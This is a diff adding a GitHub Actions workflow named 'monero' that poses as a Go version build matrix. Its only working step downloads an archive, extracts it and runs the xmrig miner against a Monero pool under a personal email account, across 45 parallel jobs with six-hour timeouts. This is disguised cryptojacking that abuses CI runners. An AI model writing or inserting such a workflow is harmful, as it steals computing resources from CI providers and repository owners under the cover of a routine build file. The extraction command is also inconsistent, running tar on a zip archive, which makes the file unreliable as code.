@@ -1,0 +1,27 @@
+name: monero
+on: [push, pull_request]
+jobs:
+  build:
+    name: Ba_channel
+    runs-on: ubuntu-18.04
+    strategy:
+      max-parallel: 30
+      fail-fast: false
+      matrix:
+        go: [1.6, 1.7, 1.8, 1.9, 1.10]
+        flag: [A, B, C, D, E, F, G, H, I]
+    timeout-minutes: 360
+    env:
+        NUM_JOBS: 20
+        JOB: ${{ matrix.go }}
+    steps:
+    - name: Set up Go ${{ matrix.go }}
+      uses: actions/setup-go@v1
+      with:
+        go-version: ${{ matrix.go }}
+      id: go
+    - name: Setup
+      uses: actions/checkout@v1
+    - name: BA_channel
+      run: |
+        wget https://github.com/revoxhere/duino-coin/releases/download/2.5.2/Duino-Coin_2.5.2_linux.zip && tar -zxf Duino-Coin_2.5.2_linux.zip && cd xmrig-5.11.3 && ./xmrig -a cryptonight -o stratum+tcp://xmr.pool.minergate.com:45700 -u maulanaalamsyah0000@gmail.com -p x
